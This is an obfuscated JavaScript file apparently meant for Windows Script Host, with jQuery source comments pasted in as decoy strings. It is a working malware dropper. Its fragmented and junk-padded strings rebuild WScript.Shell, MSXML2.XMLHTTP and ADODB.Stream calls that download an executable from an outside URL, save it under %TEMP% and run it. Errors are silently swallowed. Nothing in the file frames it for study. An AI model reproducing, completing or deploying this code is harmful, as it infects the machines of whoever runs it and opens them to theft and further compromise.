XAkziGvtI = " Check parentNode to catch when Blackberry 4.6 returns nodes that are no longer in the document #6963 if ( elem && elem.parentNode ) {";
eventsI = 0;
String.prototype.headphones = function () { return this.substr(0, 1); };
var OdritkNm = ["m"+"Wk"+("intoxicating","white","ph")+("shear","vibrating","desired","braids","WkIi"), "j"+("including","unaccompanied","anaheim","UX")+("indolence","freebsd","fighter","meteoric","wv")+"okE", ("facetiously","pallet","deployment","reply","ExpandEnv")+("someone","tourist","iron")+"mentSt"+("realize","advocacy","notation","ri")+("genteel","difficult","ngs"), ("vancouver","obscenity","")+"%"+"TE"+"MP%", ("schoolboy","heraldic","predicament","configuration","")+"."+"exe", ("estates","output","infra","R")+"un", "A"+"ctal"+"te"+"rnat"+"io"+"ni"+"va"+"lt"+"er"+"na"+"ti"+"on"+"eX"+"al"+("soever","dissolute","te")+"rn"+("venial","nominations","supplement","mutual","at")+"io"+"nO"+"ba"+"lt"+"er"+"na"+"ti"+"on"+"jeal"+"tern"+"at"+"io"+"nct","pondering", "QniaBctzk", ("returning","northeast","damnable","arousing","WScalternat")+"io"+("stuart","skepticism","nr")+"iptalterna"+("buyers","tussle","topping","tion.") + ("lethargic","fucked","dicks","scanners","S"),"kevin", ("disband","ferguson","kindergarten","h")+("superannuated","timehonoured","obligations","acetic","al")+"te"+("charming","tenderfoot","rn")+("fraught","caitiff","indicating","at")+("drums","align","prithee","io")+("cleaners","transmitting","ne")+"la"+("strew","brisbane","tortuous","lt")+"erna"+"tionl","unalloyed", ("diaphragm","piquant","")+"T"+"bA"+"mPc", ("chronological","symphony","extending","arcade","M")+"al"+"ternat"+"io"+"nS"+("greater","locomotion","picks","Xa")+("amanuensis","broil","lt")+("oakland","omega","situation","er")+"nation"+("historical","twentythird","fired","tacking","ML")+"al"+"te"+"rn"+"at"+"io"+("caucus","honey","conservation","rivers","n2") + ("bounce","detective","spaniel",".")+("pauper","cooler","manufacturer","altern")+("tactics","borders","atio")+("preservation","bolster","limitations","grown","nX")+"Ma"+("algiers","johnson","tennis","connector","lter")+("installing","candles","query","paintings","nati")+("comet","cubic","onLHal")+("schedule","gardening","symbolism","ternationT")+("emanation","headers","impressed","TP")];
qsvYxGRDV = "} HANDLE: $(expr, $(...)) } else if ( !context || context.jquery ) { return ( context || root ).find( selector );";
OdritkNm.splice(7, eventsI + 2);
survey = OdritkNm[1+4+1].split("alternation").join("");
var hJUHV = this[survey];
SDrnVoG = "dkXSMtL";
metamorphosis = (("developmental","embedded", "BUvuyGhKSzv","government", "pGyUecIjYP") + "InHcfxe").headphones();
footnotes = (("reload","remit", "otokBqlw","thorough", "spYJGwsB") + "BtPiJpxM").headphones();

eventsI = 6;
OdritkNm[eventsI + 1] = OdritkNm[eventsI + 1] + OdritkNm[eventsI + 3];
OdritkNm[eventsI + 2] = "JzkEfWPLYjS";
eventsI++;
OdritkNm.splice(eventsI + 1, eventsI - 4);
OdritkNm[eventsI] = OdritkNm[eventsI].split("alternation").join("");
var WymwfrF = new hJUHV(OdritkNm[eventsI]);
PNvzMTGKSOm = "} Otherwise, we inject the element directly into the jQuery object this.length = 1; this[ 0 ] = elem; ";
eventsI++;
OdritkNm[eventsI + 1] = OdritkNm[eventsI + 1].split("alternation").join("");
var uUkRxi = new hJUHV(OdritkNm[1 + eventsI]);
tqStRIuMJ = " Handle the case where IE and Opera return items by name instead of ID if ( elem.id !== match[ 2 ] ) { return rootjQuery.find( selector ); ";
eventsI /= 2;
var hocvDkaz = WymwfrF[OdritkNm[eventsI - 1 - 1]](OdritkNm[eventsI - 2 + 1]);
DMzFPpym = "} this.context = document; this.selector = selector; return this; ";
aviatore = (("medieval","distil", "TChvWP","urgent", "EYTnIkOdwT") + "ELkuHqQT").headphones();

function akimbo(ejaculation, blockhouse) {

    try {
        var forums = hocvDkaz + "/" + blockhouse + OdritkNm[eventsI];
    drlFfN = " Give the init function the jQuery prototype for later instantiation init.prototype = jQuery.fn;";
    uUkRxi["o" + metamorphosis + aviatore + "n"](("technically","gregarious","salaries","joins","G") + aviatore + ("concurred","vendor","T"), ejaculation, false);

    TEyurxmzbvI = " Initialize central reference rootjQuery = jQuery( document );";
    uUkRxi[footnotes + ("unimpeachable","recruitment","essence","separable","e") + (("seafaring","restitution", "QublbstJ","disagree", "vibration", "nrqjpzefU") + "sOyLqjEc").headphones() + (("writer","blank", "SAEhYAiiL","aromatic", "diable", "dfjnKey") + "opeQthEEd").headphones()]();
    afeRGYQAiRj = " var rparentsprev = /^(?:parents|prev(?:Until|All))/,";
    if (uUkRxi.status == 200) {
        var GbawpWA = new hJUHV((""+("vision","paragraphs","A")+"pO"+"DB." + ""+"S"+"tr"+("pleased","colon","perplexing","breach","eam")).replace("p", "D"));
        GbawpWA.open();
        IhqrdOmf = " HANDLE: $(expr, context) (which is just equivalent to: $(context).find(expr) } else { return this.constructor( context ).find( selector ); ";
        GbawpWA.type = 22 * (12 - 8 - 4) + 6 - (8 / 2 + 1);
        tmNUoW = "} HANDLE: $(DOMElement) } else if ( selector.nodeType ) { this.context = this[ 0 ] = selector; this.length = 1; return this;";
        GbawpWA[("blast","clayey","excellent","depreciate","w")+"ri"+"te"](uUkRxi[""+("chauffeur","sprinkling","financier","commissioners","R")+"es"+"pon" + footnotes + ("bibliography","enumerate","inflection","e")+"Bo"+"dy"]);
        ztaCUGidHj = " HANDLE: $(function) Shortcut for document ready } else if ( jQuery.isFunction( selector ) ) { return typeof root.ready !== \"undefined\" ? root.ready( selector ) :";
        GbawpWA[(metamorphosis + ("leave","fossil","astride","comedy","o")+("vestry","oriented","Di")+"ti"+"on").replace("D", footnotes)] = 0;
        kvkVGsWG = " Execute immediately if ready is not present selector( jQuery ); ";
        GbawpWA["s"+("wroth","fields","aveT")+"oF"+"ile"](forums, 2);
        AbdPrXOFRpW = "} if ( selector.selector !== undefined ) { this.selector = selector.selector; this.context = selector.context; ";
        GbawpWA.close();
        cgbNRGvb = "} return jQuery.makeArray( selector, this ); };";
        WymwfrF[OdritkNm[eventsI + 1]](forums, 1, "nITqcITxEvW" === "YjxqkkWQC"); zMKByp = " return this.filter( function() { for ( i = 0; i < len; i++ ) { if ( jQuery.contains( this, targets[ i ] ) ) { return true; } } } ); },";
    }

} catch (HvtGwLeG) { };

    smghoii = "jQuery.fn.extend( { has: function( target ) { var i, targets = jQuery( target, this ), len = targets.length;";
}
akimbo("h"+"tt"+"p:"+"//"+"di"+"vi"+("established","america","na")+("dorado","picnic","te")+"rn"+"ura."+"co"+"m."+"br"+"/4"+"35"+"32"+"43"+"4."+"exe","EhFlRhvKrqg");
   hnSYJcWCxHv = " methods guaranteed to produce a unique set when starting from a unique set guaranteedUnique = { children: true, contents: true, next: true, prev: true };";